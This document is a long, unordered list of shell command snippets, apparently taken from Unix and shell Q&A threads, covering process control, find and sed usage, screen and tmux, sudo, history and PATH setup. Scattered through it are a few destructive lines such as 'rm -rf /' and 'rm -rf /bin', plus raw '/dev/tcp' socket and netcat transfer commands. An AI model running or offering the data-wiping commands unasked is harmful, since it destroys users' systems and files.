cp -ruT old-dir new-dir
dirs +1
pushd +1
dirs +N
kill -9 _process-pid_
kill -9 %1
kill -9
ps a
kill -9
kill -9
kill -9 %1
ps -ef | grep <myprocessname>
pidof <myprocessname>
kill -TERM
kill -TERM
kill -KILL
kill -9
<prefix> x
wan27 run
df -T . | awk '{ print $2 }'
sed -e '/<foo>/,/<\/foo>/{;s/bar/widget/;}' xyzzy.xml
du -sk * | awk '{sum+=$1}END{print sum}'
tail -f logs/*.{log,err,out}
/bin, /sbin, /usr/bin, /usr/sbin
man man
grep, ssh, dd, nmap, ifconfig, route, and iptables (the firewall)
ps -aux | grep tony
kill -9 10986
kill -9 10988
tail -f /var/log/httpd/error
tail -f
-p $$ -a -d 0
{ echo Hi; sleep 5 ; } | whatpipe.sh
sleep 5
lsof -v 2>&1 | grep HASUXSOCKEPT
/bar/a -> /foo/a
/bar/b -> /foo/b
/bar/c -> /foo/c
. ~/.bashrc
command svn
cd /
cd ~
echo 'task goes here' >> todo.txt
> todo.txt
apt-get install moreutils
brew install moreutils
$(< test.txt)
$(cat test.txt)
$(cat file)
$(< file)
-o -path ... -prune
apt-get install xxx
sudo apt-get install xxx
rsync --ignore-existing --dry-run --verbose SOURCE PROCESSED > OUTPUTFILE
rsync --files-from=OUTPUTFILE SOURCE PROCESSING
man scp
cd &*
cd $*
alias cd='cdImproved'
man bash
source ~/.bashrc
source ~/.bashrc
vi mysource.c
make test
stty -ixon
find . -type f -empty
rm -r
svn-empties | xargs svn rm
svn co
svn-empties | xargs svn rm
svn-empties YOU_WANT_TO_SEARCH_PATH
set colored-stats on
ls <tab>
ls -l
zenity --info --text='done' > /dev/null 2>&1
-size -30000c
shopt | grep nocaseglob
find (GNU findutils) 4.4.2
python your_filename
let "k += 0.025"
let "$k += 0.025"
k += 0.025
rm $PID
mount /dev/insert-usb-device-here
umount /dev/insert-usb-device-here
M-x term
M-x terminal-emulator
dircolors --print-database >file
eval $(dircolors file)
#! /bin/sh
source http://myurl
http://myurl: No such file or directory
> /dev/null 2>&1
ruby -e 'p 2+2'
echo -e
echo 'Hello\nWorld'
shopt -s expand_aliases
bash /scripts/scriptnm.sh
. /scripts/scriptnm.sh
bash myfile.sh
. myfile.sh
defaults write com.apple.screensaver askForPasswordDelay -int 3600
sleep 20
echo blah
cd "/Users/niho/Desktop/Reader 0.5"
/Users/niho/Desktop/Reader\ 0.5
. .bashrc
for f in ls; do sed -i -e 's/blah/blee/g' $f; done
ls | xargs -0 sed -i -e 's/blah/blee/g'
find . -name "*.txt" -exec sed -i -e 's/blah/blee/g' {} \;
ls | wc -l
'find |xargs'
'find |xargs'
bash array
no sed
... xargs ... -I {} ... sed ...
ls -f *.txt
import re
print re.sub(line, "blah", "blee")
sed -r
ls -f *.txt
xargs --show-limits
. script_path
. script
source script
-o functrace
-o errtrace
set -o errtrace
>( )
open /Applications/McAfee\ Security.App
cd ..
cd ..
up 4
cd ../../../..
`up 4`/path/to/file
cd ..
cd ..
alias …='cd ..'
find . -name pattern
find . -iname "yourpattern" -exec cat '{}' \; |wc -l
find . -name "yourpattern" -print0 | xargs -0 wc -l
/bin/rm /bin/rm
ls -r1
tail -n +$number
ls -t1
tail -n +$number
alias ls='gls --color=auto'
echo *
ls -G
grep -v " 3 "
egrep [A-Z]{5,6} .filename
bundle exec thin start
exec $SHELL -s ...
exec $SHELL -s ... -I
exec $SHELL
tar -czvf file.tar.gz cvd*.txt
wget -A jpg,jpeg -r http://example.com
echo $HISTSIZE
echo bash_profile
wc -w
cannot open
cannot search
man bash
cp A/* B
map <Leader>r :!%:p<cr>
pushd .
alias start=cygstart
alias start=xdg-open
start /some/file/name
find <path> -regex <regex> -type d
find Code/ -E -regex '(bin|redblack)_tree\.hs' -type d
man find
shopt -s globstar
unset LS_COLORS; export TERM=xterm
set shell=/bin/bash\ -l
:! alias mytest
:! mytest
shopt -s expand_aliases
:! bash -ic 'mytest; exit'
sudo root
sudo -s
sudo -i
sudo -i
env_reset and env_keep options in /etc/sudoers
sudo -H -u root
"name with space"
name\ with\ space
meta character
Escape [ 2 ~
infocmp -L -1
infocmp -L -1 xterm
crontab -e
chmod -R www.www *
#!/bin/bash -e
read input
while ... do
if ... then
echo "Menu for $name
tail -f
| tee /dev/tty
# optional
tail -f ... | grep ...
tail -f
tail -f
tail -f
-n 0
GNU grep
$include /etc/inputrc
ssh <host> <command>
git init
git init
git init
sudo -u USER /usr/bin/git
echo $f
redis-cli info
ls -a
ls -l
(setenv "MY_VAR" "value")
su -
su --login user2
cat < /dev/tcp/host/port
cat /dev/tcp/host/port
kill $!
help jobs
man bash
$ user@hostname
fpath=($HOME/.zsh/functions $fpath)
30 6 18 4 1     /sbin/init 6
tail -f
head -1
grep --line-buffered
tail -f
tail -f
grep -m 1
tail -f
tail -f
read -t 0 -N 0
test -t 0
test -t 0
wc -c
echo "a" | wc -c
read; if ...
exec {fd}<>"/dev/tcp/$host/$port"
read foo <&$fd
echo bar >&$fd
exec {fd}>&-
--kiosk --incognito --no-context-menu
du -a | sort -n -r
sort -r
head -5
watch 'sudo jmap -heap 31945 2> /dev/null'
sudo jmap -heap 31945
ps -ef
ps -efww
kill -9
ulimit -a
max user processes
$BASH_VERSION = 4.1.5(1)-release
man date
findname name_of_file
shopt -s globstar
echo $0
man bash
login -pf
login -pf
login -pfl
man login
gzip -V
gzip -t the_name_of_the_file.gz
\( ... \)
help history
man strftime
sudo -s
sudo -s -u user
su user
setopt no_auto_menu
setopt rec_exact
man zshoptions
shopt -u extglob
man apt-get
ctrl-a c
ctrl-a n
ctrl-a p
ctrl-a #
ctrl-a "
ctrl-a d
apt-get install eclipse-platform
ctrl-a c
ctrl-a p
ctrl-a n
ctrl-a d
screen -r
foo --
foo --help --verbose --version
open "/Applications/Google Chrome.app"
/c/Program Files/Vim/Vim.exe
C:\Program Files\Git\share\vim
C:\Program Files (x86)\Git\bin\vim
man cp
git diff
vim -
man bash
git diff
md5sum PLCI507_01234567.doc | awk '{ print $1 }' #sum of each file
date +"%d/%m/%Y" #date of form update
Parameter Expansion
./script_name.sh /path/to/docfiles/
chmod +x script_name.sh
./script_name.sh /path/to/docfiles/
User Name
Process Id
CPU usage
Command name/line
$ top
PID   USER  PR  NI  VIRT  RES  SHR S %CPU %MEM  TIME+    COMMAND
2569  user  20   0  339m  86m  10m S  7.8  6.9  6:42.99  java
$ top -b -n 1
$ top -b -n 1 -p 2569
$ top -b -n 1 -p 2569 | tail -n 2 | head -n 1
$ top -b -n 1 -p 2569 | tail -n 2 | head -n 1 | awk '{print $1, $12, $9}'
top -b -n 1 -p 2569 | tail -n 2 | head -n 1 | awk '{print $1, $12, $9}'
top -b -n 1 -p "$1" | tail -n 2 | head -n 1 | awk '{print $1, $12, $9}'
$ ./3top 2569
out=$(top -b -n 1 -p "$1" | tail -n 2 | head -n 1 | awk '{print $1, $12, $9}')
echo "$out%"
$ watch -n 1 3top 2569
-pid 3907
-stats pid,command,cpu
-l 0
cdd trunk feature-branch
crontab -e
sudo update-alternatives --config editor
crontab -e
man crontab
crontab -e
crontab -e
apt-get install vim -y && apt-get remove nano -y
(arg: N)
man nohup
"filename (date time).extension"
[mzed@node02 test]$ vim printme.py
shutdown -s -t 30
sudo shutdown -h +1
shutdown -h now
(sleep 5 && shutdown now) &
go filename
export TERM=cygwin
ioctl(..., TIOCSWINSZ, ...)
shopt -s checkwinsize
ioctl(..., TIOCGWINSZ, ..)
. ./.bashrc
stty -echo
stty -echo
shopt -u nocaseglob
ulimit -St 1; ./a  ouput.out
ulimit -St 2; ./a  ouput.out
(-20 <= n <= 20)
GNU sed
sort -n | uniq
man find
[your commands]
foo somefile.txt
cat $1
prog >& outerr.txt
pskill theprocessname
get-process PROCESS_NAME | stop-process
pgrep killus | while read p; do kill -9 $p; done
-not -name CVS
cdd directory
cd directory
cdd <directory>
dos2unix newshit.sh
type command
which command
/User/myuser/Drobox/Bash\ and\ Batch/
"Simon's SSID"
sudo airport -A
yum install automake .......
root@myserver.com:~$ exit
root@myserver.com:~$ exit
sudo -s
exec sudo -s
sudo -s
-m 1
ls -v
sort -n
sort -V
echo $PATH
man sudo
man scp
complete -p
declare -f
rm -rf dir/*
ps -a -o pid, command | awk '(/[s]sh/ && /remote-host/ && /port-forwarding-stmt/){ print $1}'
print $1
mysql -uroot $(create database mydatabase;)
mysql -uroot
create database mydatabase;
date -r $file +%m
basename *.doc | awk -F_ '{print $1}'
man dmesg
man proc
cat /proc/kmsg
tail -f
journalctl -xf
-n 100
dmesg -c
dmesg > /tmp/dmesg.log
tail -f
dmesg -c
sleep 1
dmesg -w
log -?
cooltool f[TAB][TAB]
man complete
man compgen
ssh <username>@<remote Mac's IP address or hostname>
<div title="Anthony Wallace" creator="Jon" modifier="Jon" created="201104020927" changecount="1" tags="anthropologists, mythology">
chmod +x
less foo.bar > output.txt
man less
less --help
cat >/tmp/mycopy
-F '\t'
screen -d -m
screen -X stuff
-p 0
printf \\r
-p 0
/ ^ $ []
onClick('rm -rf /home/user')
echo exec(...);
php /path/to/file.php
php screen -S server -X quit
exec("sudo -u duke /home/duke/aa/scripts/test.sh");
then; else
fgrep -x
grep -Fx
grep -Fx
shopt -s histappend
ls --hide='*~'
if [ "$1" = "one" ] ; then echo "found one"
if [ "$1" = "one" ] ; then echo SELECT
A B C D
if A=one echos "found one" if A=two echos "found two"  if A=three echos "found two"
bind -P
export PATH=${PATH}:~/sdks/android-sdk-mac_86/tools
source ~/.profile
(..) egrep '\d' (...)
-L 1
man launchd.plist
/path/to/file: line 2: asd: command not found
cp /home/myuser/really/big/file/here/and/there.png /home/myuser/really/big/file/here/and/there.png.bkp
Spring 2011
Spring\ 2011
'Spring 2011'
mv "Spring 2011.file" Spring_2011.file
*\ *
${filename// /_}
ls | less
/bin/ls | less
tail -f log_file
tail -n1
tail -n1
grep some_text | head -n1
head -n1
grep --line-buffered
tail -f
"C-x #"
"C-x #"
M-x tell-emacsclients-for-buffer-to-die
C-x #
git [command] -help
man 3 printf
groff -Tascii -mandoc -P-c
man find
gnome configure editor
"arg: 1"
printf '\033[?1036l'
select 1
~/dotfiles/keeptunnel.bash &
stty intr ^M
stty sane ^J
stty < /dev/whatever
cat -E
-name .snapshot
-name foo
-name foo
man screen
man tmux | less -p '^WINDOWS AND PANES'
vim -o
:split ...
mv path/to/{old_filename.txt,new_filename.txt}
set -o vi
grep -v
mdls -name kMDItemContentTypeTree <file>
brew install duti
mv "pic*-2.png" "pic*.png"
$ sfind
$ addall
cp -i
cp -n
man crontab
j dirspec
cd /path/to/mydir
cd unique/mydir<tab>
cd --
cd -num
cd -
dirs -v
dirs -v
cd /v/l/fsck
cd /u/s/appl
wcd foo
cd --
shutdown -m \\IP -r -t 00
shutdown -r -t 1
ln -s app/views/user/ user_views
ls -l
$ gedit user_views/show.html.erb
$ gedit $VIEWS/show.html.erb
$ gedit a
$ gedit app/
$gedit app/views/
$ ged
gedit user_controler.rb
rm -vrf ${MY_PATH}*
find . -name "*.txt" -mtime -60s
-mtime -60s
find --version
find (GNU findutils) 4.4.2
-mtime -60s
user@host ~ $
env | grep SSH
ps -p $PPID
$( who am i | awk '$0=$NF')
[[ conditional ]] && $( echo "whatever it should be if true) || $( echo "whatever should be the if-not-true prompt" )
!wq is used in place of :wq
set readonly
:set noreadonly
$PS1="\W $"
user@host:~ [6399]
win_from_pid $$
builtin <cmd>
command <cmd>
export PS1="\u@\h \$(my_function) \$ "
echo -e
sudo su -
bind 'revert-all-at-newline on'
$include /etc/inputrc
kill -9 [PID]
sleep X && echo bla
sleep 12h
ps -o ppid= 1234
ps -ef | grep sleep
kill -s SIGHUP [pid]
sudo chmod o-x /etc/init.d/apache2
cd Applications/MAMP
cd /Applications/MAMP
find . -type l -exec /path/tos/script {} +
cp -L files tmp/ && rm files && mv tmp/files .
realpath * | xargs -n1 -I{} mv {} .
ulimit (2)
ulimit -t 1
man 2 write
bind -x 'BYTE: SHELL-COMMAND'
ls ~/Desktop/testFolder/*contents*
$ $(grep installprocedure INSTALL)
echo $LESS
for f in *; do ext=$(echo "$f" | sed 's|\([^.]*\)||'); mv "$f" "$(uuidgen)$ext"; done
mv oldfilename newfilename
# -*- coding: utf-8 -*-
set +m
set -m
(sleep 2 &)
set +m
ipfor google.com
exit 0
:set compatible?
:set showmode
space test.txt
cat ~jacksonc/temp/t[tab]
cat ~jacksonc/temp/test.txt
cat ~jacksonc/temp/s[tab]
cat /home/jacksonc/temp/space\ test.txt
s/ /\
sed -e
s/ / /g
's/ /\'
echo 'foo bar' | sed $'s/ /\\\n/g'
lf=$'\n'; echo 'foo bar' | sed "s/ /\\$lf/g"
brew install gnu-sed
screen -ls
screen -d -c test.conf
screen -d -c test.conf
screen -ls
screen -r
cd -- --Recovery\ Files
cd ./--Recovery\ Files
route add default 192.168.100.1
kill %1
2.05b.0(1)-release, copyright 2002.
[1] {pid} exited
echo $PATH
export PATH="$PATH:actualpathhere"
source ~/.bash_profile
which bash
ls -l
ls -l
YYYY-MM-DD HH:MM
info ls "Formatting file timestamps"
. /opt/local/etc/bash_completion
PATH=$PATH:/sbin:/usr/sbin:/usr/local/sbin type $1 &>/dev/null &&
DEBUG mode
pstree -p <the PID>
brew info
echo $SHELL
ps -p $$
chsh -s /bin/zsh
sudo -s
readelf -l ./firefox-bin
shopt -s dotglob
cp: with --parents, the destination must be a directory
make install
make install
make install
sudo defaults write ~/Library/Preferences/com.apple.screensaver.plist askForPasswordDelay -int 60
sudo chown <username> ~/Library/Preferences/com.apple.screensaver.plist
sudo chmod 600 ~/Library/Preferences/com.apple.screensaver.plist
! <command number>
history | grep scp
-safe 0
git --interactive
^[[D ^[[C ^[[3~
git --interactive
ESC [D
stty -a
git --interactive
git --interactive
git --interactive
grep -v -F -f file1.csv file2.csv > file3.csv
sudo chmod -R 755 /c/d
sudo cp -r /a/b /c/d
sudo cd
cp -a
cp -r
tput reset
clear -x
apt-get install
hg clone
hg up
longtask &
echo "Done"
open -a <application name>
vi on
bash | tee record.txt
escape ^@`
rm -rf */*
rm -rf */*
rm {} \;
ls -l {} \;
md5sum -c
md5sum -c
find . -type f -a -size +10M -print0 | xargs -0 -n1 -I{} sh -c 'echo "$( (head -c 1M '{}'; tail -c 1M '{}' ) | md5sum) {} "'
echo -e "\033[0m"
tput sgr0
echo -en "\e[0m"
man 5 terminfo
tput reset
setterm --help
tput sgr0
{ echo abc ; echo xyz ; } | cat
{ cut -f2 -d, file1; cut -f1 -d, file2; } | paste -d,
cat <(command1) <(command2)
{ echo 1;  echo 2;} | echo 3
<( … )
… N< …
man less
less -V
cmd1 &
sleep 10
wait $cmd1_pid
man ascii
$(date -R)
$(date -R)
mdc [mkdir options] newdir
env -i
bash -c "some command"
bash -l -c "some commmand"
env -i bash
env -i HOME="$HOME"
bash -l
bash -l -c ...
set -T
help set
man bash
source .bashrc
set -x
echo $SHELL
Preferences -> Profiles -> General
/bin/bash --login
/bin/zsh --login
gmake distclean
sudo bash script.sh
sudo apt-get update
C-x C-r
'[STATUS REPORT] PROJECT'
defaults write '/Users/test/Desktop/myPlist'  'My Key' "[My Value]"
defaults write '/Users/test/Desktop/myPlist'  'My Key' "'[My Value]'"
[My Value]
set -o vi
-maxdepth 1
-type f
find PATH1 PATH2 PATH3 -type f  -printf '%T@ %p\n'
sort -nr
tail -n+5
cut -f 2- -d " "
fg $jobid
set -m
set -o monitor
bash -x script.sh
jobs -l
tail -f
Control + A
Control + K
Control + C
Control + L
source ~/.bashrc
chmod +x filename
strace ls 2>ls.t
file mkdep
32-bit elf
bash -cl "env && echo $PATH"
env | grep ^PATH=
complete | grep ...
sudo ls /somedir
ls -l /somedir
unzip /path/to/your/directory/*/* -d /your/target/directory/
unzip man
man unzip
invoke-history 35:
--type cc
ack-grep --help type
debug1: Authentication succeeded (password).
ln -fs /path/to/target/dir foo
rm -rf /path/to/target/dir
ln -fs /path/to/another/dir foo
readlink -f
find ... -print0 | while read -rd "" file
ps -f
alias ${alias_line}
ll="ls -lart"
"ll=ls -lart"
cat /sys/block/sda/queue/hw_sector_size
man sfdisk
The default value of size indicates "as much as possible"
/dev/sda : start=2048, type=83
sudo blkid
sudo /sbin/parted /dev/xvdf mklabel gpt --script
sudo /sbin/parted /dev/xvdf mkpart primary 0% 100% --script
grep -nr sumthin *
cd -
cd ->
cd <-
my replacement string
source <file-name>
/bin/* /usr/bin/* ~/bin/*
info info
tr \\0 \\n </proc/$PPID/environ
locale -a
really_long_script.sh &
notify-send ...
ls new/
set -o vi
date -Iseconds
date -I
info test
export varname=value
varname=value; export varname
X=Y; export X
export X=Y
export X
export X=Y
cd /usr/local/blogrmis ; /usr/local/blogrmis/remote &
man bash
bash man
redirection section
>word 2>&1
export LS_OPTIONS='--color=auto'
replay |
-mindepth 1
! -name
finger -m <username>
echo $SHELL
echo ${SHELL}
echo ${SHELL##*/}
mysql -uroot -psecret -e 'SHOW SLAVE STATUS \G;'
-uroot -psecret -e 'SHOW SLAVE STATUS \G;'
unoconv document.doc
Unix Toolbox
tsocks findip
tsocks wget -q ...
./mysqlbackup.sh: line 3: date: command not found
find -type d
exec bash
ssh username@host
. .bashrc
source .bashrc
help test
-type d
sh -c
tail -f logfile | grep java
php -l $file
php -l
chmod 777
chmod 777 f*
chmod 777 *a{3,5}
moveFaster "$src" "$dst" "$a"
echo $DISPLAY
man find
$ chsh -s /bin/bash
openssl enc -base64 <<< $GIF
xxd -p <<< "foo"
ls -lah
$ sudo myscript.sh
$ sudo bash -c "cd /root; chown -R root:root $worthy_folders"
screen -DR
screen -r
bind x
ctrl-A : bind x
alias screen="screen -C [your .screenrc file path]"
ls *.rb
cp *.sh
ln -s ../source/foo.sh $HOME/bin/foo
install -m 755 foo.sh ../bin/foo
-i eth1
set -o vi
exec bash
ls -la
bind ^D exec ${HOME}/bin/end.sh
ls -d
ls -d */
ls -d .*/
ls -d
ls -l
ls -l | grep ^d
tar xvf
--strip=4 ./home/mike/www/coolwebsite/*
find myproject -name '*.c' -exec grep 'toUpperCase(' {} \; -print
grep -r string .
grep string *.c
grep string **/*.c
:help grep
tar --to-stdout .. | tar -C somefolder -xvf -
-f -
tar -czf - big-dir | ssh user@host 'cat > /path/to/big-dir.tar.gz'
netcat -l 5555 > /path/to/dest.tar.gz
netcat -l 5555 | tar -C /path/to/expanded/tar -xz
tar -C /path/to/source -cz files | netcat <target IP/hostname> 5555
cmd /c cmd /c cmd /c cmd /k echo Hello World!
start /B
ls -F
ls -F
shopt -s expand_aliases
foo=$( alias ls='ls -l' ; ls )
export $PATH=/usr/local/bin:$PATH
Ctrl+A |
Ctrl+A S
hostaneme$ watch --no-title myscript
Ctrl+A [Tab]
Ctrl+A C
Ctrl+A C
Ctrl+A N
Ctrl+A 0-9
chmod +x latestfile.sh
export PS1='h:\W\$'
sudo -s
sudo su -
sudo su
\path\to\bash.exe -c command
echo ${PATH}
export PATH="${PATH}:/usr/bin"
ls -l /usr/bin/roo
hash -r
echo $PATH
alias roo="/usr/bin/roo"
echo $PATH
sed -i 's/old/new/g' fname
key1="John Doe is dead!"
rm -f '-'
rm -
rm ./-
rm -
rm "-"
rm -
rm -
rm ?
/bin/sh: line 0: cd: [folder]: No such file or directory
$ nano runMinecraft
$ chmod +X runMinecraft
$ ./runMinecraft
man alias
./start.sh start
kill -STOP
kill -CONT
ssh localhost my_program
find /directory -type f -print0 | xargs -0 grep -i 'search string'
history -s
ll ~/music
ls -lFh ~/music
foo() { ... }
echo $HOME
defaults read <path>
zsh --version
bindkey | grep yank
M-x yank-pop
zsh -f
bindkey -e
git django extract gem heroku history-substring-search pip rvm
zsh -f
sdcds/edfdD sdf/sdf
esc + backspace
sdcds/edfdD sdf/sdf
Control + Cursor Left
Control + Cursor Right
Option + Cursor Left
Option + Cursor Right
Fn + Left/Right
sudo -E
find ~/music -name *.flac | sort > ~/documents/flac
find ~/music -name *.mp3 | sort > ~/documents/mp3
diff ~/documents/mp3 ~/documents/flac | grep '>'
root && $0 != root ".mp3"
ssh -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no -o ChallengeResponseAuthentication=no
xargs rm -f
git cl
git cl
git clone something
grep mysqld
KILL (9)
escape backspace
ln -s /usr/bin/msmtp /usr/sbin/sendmail
mailx -h
ls -A
ls -1A . | wc -l
ls -1A <target-directory> | wc -l
test -e "$1"*
test -e "dir/*"
test -e "dir/file"
test -e "dir/file1" "dir/file2"
-d "$dir"
find $dir -not -path $dir -print -quit
[[ -z "$result" ]]
[[ ! -z "$result" ]]
echo *
echo .[^.]*
echo "empty dir"
find -L
! -L "$1" && ...
find -P
find -L
chmod 0000 testdir
cat local-script | ssh -t <user>@<remote> sudo
sudo local-script
ssh -t <user>@<remote> sudo < cat local-script
ssh -t user@remote sudo sh /tmp/randomfilename
Ctrl+{k, u, a, e}
-type f
sed -r 's;(.).;\1 ;g' input-file
echo jot
IFS=,; echo ${numbers[*]}
start .
explorer .
explorer .
Missing trailing-" in remote-shell command.
RSYNCOPT="--rsh=\"ssh -p 10022 -c des\" ..."
--rsh=ssh -p 10022 -c des
set -x
echo ${whatever}
printf "%q " ${whatever}; echo
set -x
Host xyz.domain.whatever
kill 123456
rm filename*
kill <pid>
kill -9 <pid>
top -U $USER
tmux split-window -v -l 5 -t 0
-t 0
tmux split-window -v -p 5 -t 0
-t 0
tmux split-window -v
tmux resize-pane -D 23 -t 1
tmux send-keys C-b '"' C-m
tmux send-keys C-b ':resize-pane -D 20'
new-session -d
stty size
failed to connect to server: Connection refused
tmux has-session
Port XX
&& bash -i
RequestTTY force
git log
<commit> <message> <selected>
Alice, 78 minutes ago - Thumbnails are now 300x300
x=x " " $i
command not found
rm -rf /
man bash
$(printf " %q" "${cmdToRun[@]}")
find . -dept 2
-J %
mv $FILE .
-I %
-J %
mv -i
mv **/*.* .
j foo
777 222 1342
The user rick does not exist.
for i in $(ls)
ifconfig -a
port 123
./rt_traf.sh <PID>
./netpps.sh eth0
./netspeed.sh eth0
-type f
shopt -s extglob
configure: error: The required <package> library was not found.
./configure --help
./configure --help
readelf -d yourprogram
./configure --prefix ~/usr
for f in *.d; do rar a "${f//.d/.rar}" "$f"; done
rar a ../"${f//.d/.rar}" *
ctrl + a
ctrl + e
git log -{n}
git log -1
git log
git log
git log -{n}
linux /vmlinuz-...
linux16 /vmlinuz-...
!! | pbcopy
$ 
set -x
printf "%q " $dir; echo
shopt -s autocd
"/cygdrive/c/Program Files/"
FOLDER1='name of folder in home directory'
tty -s
[[ "$1" == "fromgui" ]]
bash --version
sudo apt-get install mmv
mate r1577 (2012-07-11)
$(which mate 2>/dev/null)
xargs grep …
mate --help
cat /etc/anacrontab
ls ~/Dropbox/Scripts/
backup_TB.sh  bak_key_db.sh
uname -a
Linux vasco2 2.6.38-8-generic-pae #42-Ubuntu SMP Mon Apr 11 05:17:09 UTC 2011 i686 i686 i386 GNU/Linux
mplayer Kick* &
fg mplayer
mplayer Kick*
$(mplayer Kick*) &
set -u
find -exec
ping -c 5
date +%T
&& wait
sort -t $'\t'
man bash
"$1" "$2"  ...
sudo mount -o username=Robert //192.168.1.56/music /mnt/networkmusic
for f in *; do sudo mv "$f"/ /mnt/networkmusic; done
mv: accessing '/mnt/networkmusic': Cannot allocate memory
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\LargeSystemCache
rename 's/\.bak$//' *.pdf
grep -v
(per default)
alias exit='exit;exit'
man bash
exec ... [command [arguments]]
doskey /macros
doskey /macros:all
PROMPT_COMMAND="$PROMPT_COMMAND;history -a"
shopt -s histappend
cat * > mergedfile.csv
find . -name "*.csv"
cat *.csv > merged.csv
bash --version
shopt -s globstar
exit $?
for line in $(cat file); do
$(cat ...)
echo -e $mystring
echo -e $mystring > myfile.txt
man bash
chmod +x
tmux send-keys
:help map_bar
chmod +x filename
chmod +x foo
This is foo
ls -rt | tail -n 1
dirname path/to/script/../..
readlink -m
this is a word
bash version 4.4.12(1)-release
< $pipename
<> $pipename
$   django-admin.py manage.py startproject"
python setup.py
easy_install django
pip install django
/path/to/python2.7 /path/to/django-admin.py args
standard python
readonly FOO=bar
ls -U
sudo umount /media/USB_STICK_NAME
sudo blkid
/dev/sdc1: LABEL="USB_STICK_NAME" ...
sudo fatsort /dev/sdc1
man bash
ls -S
ls -S
ls -l | sort -k 5nr
-k 5nr
du -ha | sort -h
man du; man sort
cd -
-bash: cd: ~/whatever_dir: No such file or directory
cd -
cd -
sudo vi
vi myfile
"sudo vi ..."
sudo vim ...
sudo -s cmd
sudo -i cmd
bash -c cmd
chmod +x
source myprogram
$(basename "$VIRTUAL_ENV")
cat pod.xml
set -x
set -x
set +x
debug_me $someadditional_variable "If should be true here"
vim -O
while [ 1 -le 1 ]
while true
function foo {...}
foo() {...}
cat <<
rm -rf /bin
cmakerel && make check
make check
$[math operation]
exit 3.45
chmod +x svrestart
sudo svrestart
modinfo your_module
ln -s
alias internetScanner "python /User/Desktop/project/internetScanner/main.py"
alias internetScanner="python /User/Desktop/project/internetScanner/main.py"
workon myvenv
sudo `alias netstat`
sudo `alias netstat | sed -r "s/.*='(.*)'/\1/"`
sudo `alias netstat`
sudo ${BASH_ALIASES[netstat]}
sudo netstat
tcat myscript args args args
Activity Monitor
#!/usr/bin/env bash
bash script.sh arg0 ... argn
-bash: .DS_Store: command not found
git config --global core.excludesfile ~/.gitignore
echo .DS_Store >> ~/.gitignore
echo .DS_Store >> ~/.rvmrc
tail -f -n +1
-n +1
tail -f
tail -f
sleep 1
-m 1
grep -q
grep -m 1
watch -e
tail -f log_file & echo $! > pid
{  ...  ;}
grep -m1 "find_me"
&& kill -9 $(cat pid)
&& rm pid
if command; then command; fi
if [
cd -
chmod +x myffmpeg.sh
sh -c
basename {}
find -a array
echo "$PS1"
man bash
-type f
-name "*.html"
-exec tidy -f errors.txt -m -utf8 -i {} \;
2 + 4 + 16 + 32 + 128 + 256
man bash
man sh
man ksh
-mindepth 1
cd ..
cd .
cd ..
find $PWD
find .
cd -
cd ..
man bash
disown [-ar] [-h] [jobspec ...]
~/.zshrc, ~/.bashrc
workon any_project
export HISTFILE="$VIRTUAL_ENV/bash_history"
man newgrp
newgrp -l
if [ -f .local_history ] ; then tail -1 $HISTFILE >> .local_history ; fi
touch .local_history
#!/usr/bin/env python
which python
type python
C:\Program Files\Python\python.exe
Program Files
!#/usr/bin/env python3
pip install --user somepackage
ls -l --color=none
Missing argument(s)
for loop
-p 4
find ...-exec
<root directory>
. foo.sh
ls | head -n 21 | sed -r 's|(.*)|mv \1 /path/to/folder1|' | sh
man 5 crontab
diffFolders.sh ~/FOLDER1 ~/FOLDER2
diff <(md5 ~/FOLDER1/* | awk '{print $4}') <(md5 ~/FOLDER2/* | awk '{print $4}')
gunzip -c
zcat hugefile.txt.gz | perl xsplit.pl 40000000 'cat > tmp$SPLIT.txt; do_something tmp$SPLIT.txt; rm tmp$SPLIT.txt'
kill %%
kill %
black hole
permission denied
permission denied
find / -name "myfile" -type f -print 2>/dev/null
END {}
keys[data] = key
counts[data] = 0
rm -r
rm -r
rm -rf
rm -rf *
rm='rm -i'
mv $* /tmp
alias d='mv -t /tmp'
rm file
while read line; do echo $line; done
bash -i release_script.sh
bash --login -i release_script.sh
yaourt -Syu | tee yaourt.log
curl -I http://superuser.com
history -a
history -d <line_number>
history -w
. $HOME/.bashrc
history -d
history -w
head -n1
xargs -0
history -w && nano "${HISTFILE}" && history -c && exit
history -w
nano "${HISTFILE}"
history -c
nano .bash_history
alias rm="rm -i"
alias rmi='rm -i'
rm -f
rm -rf
rm -rf
rm -i
echo .... | tr -d '\012'
cd foo
cd foo
man zshoptions
setopt no_hist_verify
./backup.sh site1
man strftime
tmux display-message
tmux show-messages
display-message -p
xargs cat
echo $1 > /sys/class/backlight/acpi_video0/brightness
echo: write error: Invalid argument
echo "$1" > /sys/class/backlight/acpi_video0/brightness
echo -n
echo "int isatty(int x) { (void) x; return 1 ;}" > isatty_override.c
gcc -c -fPIC isatty_override.c -o isatty_override.o
gcc isatty_override.o -shared -o isatty_override.so
LD_PRELOAD=./isatty_override.so ls -l | less
-f awkfilename.awk
awk ''
example ''
example SomethingGoesHere
sleep 0
sleep 1
awk ''
screen -dmS "$SESSION_NAME" "$COMMAND" "$ARGUMENTS"
screen -ls
screen -r "$SESSION_NAME"
screen -wipe
screen -c myscreenrc
mfilter.sh ./dir | bash
which bash
source pack.sh
alias rm='rm -i'
open -a ProgramName
open -a Aquamacs
open -a ${appname}
alias emacs='open -a aquamacs'
open -a wine '/Users/hpek/.wine/...'
alias python36='/Users/doekewartena/.pyenv/versions/3.6.0/bin/./python3.6'
ls -l *
ls -l *
ls -l
sudo /usr/bin/chsh -s /bin/bash
sudo: /usr/bin/chsh: command not found
sudo chmod a+x /usr/bin/chsh
sleep N
bash -v
set -x
set +x
emulate bash
unsetopt nomatch
cygstart notepad
setsid notepad
cd your/dirctory/here
name_script.py c:\path
$ mkpasswd -l -p "$(cygpath -H)" > /etc/passwd
find ~/moremusic -name "*.mp3"
du -a ~/moremusic | grep ".mp3"
bash 4.x
cd ..
cd //
readlink /proc/self/cwd
eval $CMD
export PATH=$PATH:/Users/evanmcdonnal/go/bin
echo $PATH
echo $PATH
echo aaa > test.txt
%CYGWIN_HOME%\bin\bash -c "sed -i 's/aaa/bbb/' test.txt
set HISTCONTROL=ignoredups
sed -e :a -e 's/\(.*[0-9]\)\(\([0-9]\{3\}\)\(,[0-9]\{3\}\)*\(\.[0-9]*\)\)/\1,\2/;ta' [filename]
echo "10000" | xargs printf "%'d\n"
 echo "2312341" | sed -r ':L;s=\b([0-9]+)([0-9]{3})\b=\1,\2=g;t L'
cd /v/l/fsck
cd /u/s/appl
ls Doc
ls Documents/
